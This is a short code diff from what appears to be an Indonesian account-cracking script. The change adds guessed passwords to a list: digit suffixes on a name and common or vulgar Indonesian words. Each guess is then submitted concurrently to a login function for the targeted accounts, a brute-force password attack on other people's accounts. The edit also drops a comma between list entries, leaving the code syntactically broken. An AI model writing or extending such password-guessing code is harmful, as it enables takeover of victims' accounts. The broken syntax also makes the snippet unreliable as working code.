@@ -219,11 +219,15 @@ def pilih_menu():
                          str(x) + '1234',
                          str(x) + '12345',
                          str(x) + '123456'
+                         str(x) + '62895'
                          ]
                     litpas.append('Sayang')
                     litpas.append('Bangsat')
                     litpas.append('Kontol')
                     litpas.append('Anjing')
+                    litpas.append('Memek')
+                    litpas.append('Indonesia')
+                    litpas.append('Jakarta')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
